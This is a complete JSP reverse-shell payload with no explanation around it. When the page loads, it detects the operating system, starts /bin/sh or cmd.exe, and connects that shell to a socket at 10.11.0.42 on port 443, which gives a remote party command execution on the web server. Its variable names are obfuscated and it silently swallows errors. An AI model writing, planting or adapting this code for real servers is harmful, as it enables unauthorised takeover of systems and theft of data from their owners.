<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hg;
    OutputStream pq;

    StreamConnector( InputStream hg, OutputStream pq )
    {
      this.hg = hg;
      this.pq = pq;
    }

    public void run()
    {
      BufferedReader ur  = null;
      BufferedWriter ksm = null;
      try
      {
        ur  = new BufferedReader( new InputStreamReader( this.hg ) );
        ksm = new BufferedWriter( new OutputStreamWriter( this.pq ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ur.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ksm.write( buffer, 0, length );
          ksm.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ur != null )
          ur.close();
        if( ksm != null )
          ksm.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.11.0.42", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
